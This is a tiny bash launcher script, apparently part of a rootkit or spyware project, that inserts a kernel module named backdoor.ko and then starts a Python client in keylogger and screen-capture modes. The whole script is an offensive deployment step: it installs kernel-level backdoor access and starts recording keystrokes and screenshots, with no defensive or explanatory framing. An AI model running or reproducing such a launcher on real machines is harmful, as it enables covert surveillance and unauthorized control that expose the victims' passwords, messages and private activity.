#!/bin/bash

# INSERT KERNEL MODULE
insmod backdoor.ko

# RUN CLIENT 
python3 client.py keylogger & python3 client.py prtsc